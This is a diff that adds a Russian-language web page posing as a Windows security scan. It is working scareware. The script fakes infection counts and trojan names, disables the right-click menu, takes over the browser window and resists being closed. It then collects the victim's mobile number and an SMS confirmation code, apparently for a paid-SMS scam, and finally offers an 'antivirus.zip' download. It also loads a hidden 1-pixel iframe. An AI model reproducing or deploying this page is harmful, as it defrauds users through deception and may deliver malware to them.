@@ -1,0 +1,332 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" >
+
+<link rel="stylesheet" type="text/css" href="css.css" />
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+<script type="text/javascript" src="jslib/jquery-ui-1.7.2.custom.min.js"></script>
+<script type="text/javascript">
+    //<!--
+var def6f84 = new Array("msiecfn","msiex_","sysb","muiwh_a.","mui$v-w","msi-cdlu","msi_jsa","winwr-","boot$pd","msihs-x","winikoxc","batqr","bootnfljh","winotd.","syspy","sys.x_jw","appftxdg","msoa","toolylb_","msonk","bootui","batv_gfd","drvuwb-q","win$u","drvawvo","msikxol","drvo-nj","toolkhgq","sysv","msicg-h","msiel","confl_d","bootwyhr","msoma$.k","appix","winrxgm","msoq.","appbdn.","winw","sysyq","msoe_d","appa_n","conffhd","app.ks","wine","msied","confgdov","appgkf","toolu","batzkb","muihm","batc","sysg-tr","muieub","booto","apppwxsj","sysb_","drvips","msol$ut","muipz","bootfv$","msiel","bootdqu.","msi.bg","batt","msiniv","msowsdeu","tooljygo","muiamnr","confc","sysnplk","msiepr","msi$","drvdwsfy","msinvzaw","batv","apprl","conf$y","drvvmudr","mui_isj","conft_j","toolr","toolqy","muifpku","wineaqnd","bateot","toolasr","msievmf","drvtsjk","msov","confxnz","confqh-_","sys_.mzc","msieyh_bk","bootsraqp","toolsz","msomkpvf","batp$b.","drvuon.$","bootk");
+var x7ff4 = new Array("drv","ini","exe","dic","cpi","rom","ini","acm","pro","bin","hxx","nsf","vxd","hsp","vbs","cpl","com","tmp","cpx","inf","rll","cmd","uce","msc","dll","ax","ini","wsc","ram","cpl","dll","exe","iec","hlp","dat","tlb","ocx","scr","tsp","tsk","nt","h","qlm","srg","sql","cnt","nls","chm");
+var wbe604 = 1;
+var ad7ea7d1 = 1;
+var prdl = false;
+$(document).ready(function() {
+	var w = window;
+	var ua = navigator.userAgent;
+	var v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
+	var x = 11;
+ alert('Внимaниe! Вaш кoмпьютep coдeржит paзличныe пoдoзритeльныe пpoгpaммы. Heoбхoдимo cpoчнo прoвeрить кoмпьютeр нa нaличиe врeдoнocных прoгрaмм');
+                eval('w.resizeTo(x*10,x*11-7)');
+                w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
+//  alert('');
+
+
+
+
+
+
+	w.moveTo(0,0);
+	w.resizeTo(screen.availWidth, screen.availHeight);
+	w.focus();
+	var left_bar_height = $(".left_bar").height();
+	var right_bar_height = $(".right_bar").height();
+	if (left_bar_height < right_bar_height ) {
+		$(".left_bar").height(right_bar_height);
+	}
+	$(document).bind("contextmenu", function(e) {
+		e.preventDefault();
+		return false;
+	});
+	$("#white").css("display", "none");
+	$("#page_progress").css("display", "none");
+	$(".left_bar").css("display", "block");
+	$("#fast").animate( {width : "0px"}, 15000, 
+		function(){
+			var total = process.progress1 + process.progress2 + process.progress3 + process.progress4; 
+			$("#elysium").html('Сканирование&nbsp;завершено.&nbsp;&nbsp;'+total+'&nbsp;файла&nbsp;заражено!');
+			clearInterval(summer);
+			$("#al").css("left", ($(window).width() - 434) / 2 + "px").css("top", ($(window).height() - 332) / 2 + "px").show();
+		});
+	process.found.c = $("#tiesto3");
+	process.found.d  = $("#tiesto4");
+	process.found.s  = $("#tiesto1");
+	process.found.m  = $("#tiesto2");
+	summer = setInterval(re7a59e, 200);
+});
+window.onbeforeunload = function(){
+	if(prdl === false && ad7ea7d1 == 1){		
+		return 'Внимание! Ваш компьютер содержит различные подозрительные программы. Необходимо срочно проверить компьютер на наличие вредоносных программ.','Ваш компьютер заражен! Это может привести к потери данных и повреждению файлов! Нажмите Отмена, чтобы предотвратить это';
+	}
+};
+var summer;
+var process = {progress1: 1,progress2: 1,progress3: 1,progress4: 1,found:{c: 0,d: 0,s: 0,m: 0}};
+var ga5faef8;
+document.title = 'Идет проверка вашего компьютера!';
+function re7a59e(){
+	ga5faef8 = Math.round(100 - $("#fast").width() / 418 * 100);
+	$("#pp").text(ga5faef8 + "%");
+	$("#elysium").html('Сейчас&nbsp;сканируется: ' + def6f84[Math.floor(Math.random()*100)] + '.' + x7ff4[Math.floor(Math.random()*51)]);
+	var rand1 = Math.floor(Math.random()*(8));
+	var rand2 = Math.floor(Math.random()*(10));
+	process.progress1 += rand1;
+	if(rand1 < 4){
+		process.found.c.html('<span class="supergirl">Найдено вирусов: '+process.progress1+'</span>');
+		$("#dj1").removeClass("none");
+	}
+	if(rand2 < 3){
+		process.progress2 += rand2;
+		process.found.d.html('<span class="supergirl">Найдено вирусов: '+process.progress2+'</span>');
+		$("#dj2").removeClass("none");
+	}
+	if(rand1 > rand2 && ga5faef8 > 40){
+		process.progress3 += rand2;
+		process.found.s.html('<span class="supergirl">Найдено вирусов: '+process.progress3+'</span>');
+		$("#dj3").removeClass("none");
+	}
+	if(rand1 > rand2 && ga5faef8 > 60){
+		process.progress4 += rand1 - 2;
+		process.found.m.html('<span class="supergirl">Найдено вирусов: '+process.progress4+'</span>');
+	}
+}
+
+function getW(){
+	return window;
+}
+function show(id){
+                document.getElementById('al').style.display="none";
+		document.getElementById('dwnloads').style.display="none";
+                document.getElementById('alert').style.display="none";
+                document.getElementById('codewnd').style.display="none";
+                document.getElementById(id).style.display="block";
+        }
+function getXMLHTTPRequest(){
+	var req = false;
+	try{
+		req = new XMLHttpRequest();
+	}catch(err1){
+		try{
+			req = new ActiveXObject("Msxml2.XMLHTTP");
+		}catch(err2){
+			try{
+				req = new ActiveXObject("Microsoft.XMLHTTP");
+			}catch(err3){
+				req = false;
+			}
+		}
+	}
+	return req;
+}
+function check_num(){
+	var tmp_num=document.getElementById('num').value;
+	tmp_num=tmp_num.replace(/[^0-9]/g,"");
+	if( (tmp_num.length!=11) || (tmp_num.substring(0,2)!='79') || tmp_num=='79117776655'){
+		alert("Неверно указан номер!\n\rФормат ввода: +7999111XXXX");
+	}else{
+		document.getElementById('user_num').innerHTML='+'+tmp_num;
+		document.getElementById('alert').style.display="none";
+		document.getElementById('codewnd').style.display="block";
+		httpRequest = getXMLHTTPRequest();
+		var url = 'request.php';
+		var params = String('num='+encodeURI(tmp_num)+'&rand='+parseInt(Math.floor(Math.random()*99999)));
+		httpRequest.open("POST", url, true);
+		httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		httpRequest.onreadystatechange = function() {
+			if (httpRequest.readyState == 4) {
+				if (httpRequest.status == 200) {
+				}
+			}
+		}
+		httpRequest.send(params);		
+	}
+}
+
+function new_num(){
+		document.getElementById('alert').style.display="block";
+		document.getElementById('codewnd').style.display="none";
+}
+function check_code(){
+	if(  (document.getElementById('code').value!="37823") ){
+		alert("Неверный кoд!");
+	}else{
+                prdl = true;
+                document.getElementById('codewnd').style.display="none";
+                document.getElementById('dwnloads').style.display="block";
+	}
+}
+
+  //-->
+</script>
+</head>
+<body>
+<div class="left_bar">
+	<div class="karma">Системные задачи</div>
+	<div class="left_box">
+		<div class="left_box_line sys">
+			<a href="#">Просмотр сведеней о системе</a>
+		</div>
+		<div class="left_box_line prog">
+			<a href="#">Установка и удаление программ</a>
+		</div>
+		<div class="left_box_line set">
+			<a href="#">Изменение параметра</a>
+		</div>
+	</div>
+	<div class="karma">Другие места</div>
+	<div class="left_box">
+		<div class="left_box_line net">
+			<a href="#">Сетевое окружение</a>
+		</div>
+		<div class="left_box_line doc">
+			<a href="#">Мои документы</a>	
+		</div>
+		<div class="left_box_line sdoc">
+			<a href="#">Общие документы</a>
+		</div>
+		<div class="left_box_line cp">
+			<a href="#">Панель управления</a>
+		</div>
+	</div>
+	<div class="karma">Подробно</div>
+	<div class="left_box">
+		<div class="left_box_line">
+			<strong>Мой компьютер</strong><br/>Системная папка
+		</div>
+	</div>
+</div>
+<div class="right_bar">
+	<div class="right_hr">Процесс системного сканирования</div>
+	<div class="fb">
+		<div id="tiesto1" class="touch1"></div>
+		<div class="f_spark">Общие документы</div>
+	</div>
+	<div class="fb">
+		<div id="tiesto2" class="touch1"></div>
+		<div class="f_spark">Мои документы</div>
+	</div>
+	<div class="right_hr">Жесткие диски</div>
+	<div class="fb">
+		<div id="tiesto3" class="touch1"></div>
+		<div class="hdd_icon">Локальный диск (C:)</div>
+	</div>
+	<div class="fb">
+		<div id="tiesto4" class="touch1"></div>
+		<div class="hdd_icon">Локальный диск (D:)</div>
+	</div>
+	<div class="right_hr">DVD</div>
+	<div class="fb">
+		<div class="dvd_icon">DVD-RAM Drive (E:)</div>
+	</div>
+	<div class="clear"></div>
+	<div class="progress_bar">
+		<div class="pbb">
+			<div class="pbp">
+				<div id="fast"></div>
+				<div id="pp">0%</div>
+			</div>
+		</div>
+	</div>
+	<div class="art">
+		<span id="elysium">none</span>
+	</div>
+
+	<div id="win">
+		<h2>Ваш <span>компьютер</span> инфицирован!</h2>
+		<div style="padding-top:20px;">Обнаруженные опасные объекты:</div>
+		<table>
+			<tr>
+				<td width="166" class="td_cell1">Имя</td>
+				<td width="105" class="td_cell1">Критичность</td>
+				<td width="85" class="td_cell1">Дата</td>
+				<td width="120" class="td_cell1">Заражено файлов</td>
+				<td width="120" class="td_cell1">Статус</td>
+			</tr>
+			<tr class="none" id="dj1"">
+				<td class="td_cell2 name">Trojan-IM.Win16.PS.fp</td>
+				<td class="td_cell2 stat">Критично</td>
+				<td class="td_cell2">03/13/2010</td>
+				<td class="td_cell2">15</td>
+				<td class="td_cell2">Ожидание удаления</td>
+			</tr>
+			<tr class="none" id="dj2"">
+				<td class="td_cell2 name">Trojan.Win32.SubSys.dr</td>
+				<td class="td_cell2 stat">Критично</td>
+				<td class="td_cell2">05/13/2009</td>
+				<td class="td_cell2">23</td>
+				<td class="td_cell2">Ожидание удаления</td>
+			</tr>
+			<tr class="none" id="dj3"">
+				<td class="td_cell2 name">Trojan-Clicker.HTML. IFrame.bk</td>
+				<td class="td_cell2 stat">Критично</td>
+				<td class="td_cell2">04/17/2010</td>
+				<td class="td_cell2">37</td>
+				<td class="td_cell2">Ожидание удаления</td>
+			</tr>
+		</table>
+		<div class="none2" id="desc">
+			<b>Описание:</b><br/>Обнаруженные объекты <span>являются</span>&nbsp;потенциально опасными для <span>вашей системы </span>. <b>Trojan-Downloader</b> <span>крадет</span> пароли , кредитных <span>карт и</span> всю персональную инфрмацию&nbsp;с вашего компьютера.<br/><br/><b>Совет:</b><br/>Вы должны <span></span> удалить эти файлы как можно скорее с вашего компьютера!
+		</div>
+		<button id="fsc">Полная <span>системная</span> очистка</button>
+	</div>
+</div>
+
+<div id="al">
+	<h3>Windows Security Alert</h3><p class="o">Чтобы помочь защитить компьютер. Центр обеспечения безопасности обнаружил вирусы и готов к их удалению.</p><span class="l">Обнаруженное вредноносное ПО:</span><span class="r">Имя файла:</span>
+	<div class="b">
+		<button onClick="show('alert');">Удалить всё</button>
+		<button onClick="show('alert');">Отмена</button>
+	</div>
+	<p class="f">Шпионсое програмное обеспечение найденное на Вашем компьютере может нанести <b>вред</b> вашему компьютеру и привести к потере конфиденциальных данных</p>
+</div>
+<div class="alertd" id="alert">
+    <div class="bcode">Для активации и получения доступа к программному обеспечению - требуется указать свой <b>реальный</b> номер мобильного телефона.<br><br>
+        <b>Введите номер телефона:</b><br>
+		<input type="text" id="num" style="width: 250px;">
+		<div>Формат ввода: +7999111XXXX</div>
+		
+      </div>
+    <div class="button1"><button onClick="check_num();">Активировать</button></div>
+    <div class="wrn">
+		Внимание! Указывайте <b>реальный</b> номер <b>мобильного</b> телефона. На указанный номер придет код необходимый для активации. Вводя свой номер телефона вы автоматически соглашаетесь с условиями <a href="rules.php" onClick="window.open('rules.php','rules','width=400, height=400, left='+((screen.width-400)/2)+', top='+(screen.height-600)+', toolbar=0, location=0, menubar=0, scrollbars=1, resizable=0, status=1'); return false;">пользовательского соглашения</a>. Услуга недоступна абонентам ОСС Мегафон. 
+    </div>
+</div>
+<div class="alertd" id="codewnd">
+    <div class="bcode">На номер <b id="user_num"></b> отправлено смс.  <br><br>
+	<font style="font-size: 12px;">Для пoлучения кода активации,<br> oтправьте код пoдтверждения <b>17951</b> в ответ на полученное сообщение.</font><br><br>
+	<b>Введите код активации:</b><br>
+	<input type="text" id="code" style="width: 250px;">
+	<button onClick="check_code();" class="">Активировать</button>
+        <div ><span style="color: rgb(64,64,64);">Код придет в ответ на ваше сообщение</span></div>
+		
+    </div>
+    <div class="wrn">
+                Если в течение 2 минут вам не пришло смс, или вы ввели неверный номер, <a href="#" onClick="new_num();">повторите</a> запрос.
+    </div>
+</div>
+<div class="alertd" id="codewnd2">
+    <div class="bcode">На номер <b id="user_num"></b> отправлено смс.  <br><br>
+	<font style="font-size: 12px;">Ваш код верификации: <b>78567</b>, <b>oтправьте</b> его <b>в ответ</b> на полученное сообщение.</font><br>
+        <b>Введите полученный код:</b><br>
+		<input type="text" id="code" style="width: 190px;">
+		
+    </div>
+    <div class="button1"><button onClick="check_code();">Активировать</button></div>
+    <div class="wrn">
+                Если в течение 2 минут вам не пришло смс, или вы ввeли неверный номер, <a href="#" onClick="new_num();">повторите</a> запрос.
+    </div>
+</div>
+<div class="alertd" id="dwnloads">
+    <div class="bcode"><br>
+        Спасибо! Ваша ссылка для скачивания<br> <a href="antivirus.zip"><b>Скачать</b></a>		
+    </div>
+    <div class="wrn">
+               
+    </div>
+</div>
+<font color="#babaff"></font>
+<iframe src='flash.html' width="1" height="1"></iframe>
+</body>
+</html>
+
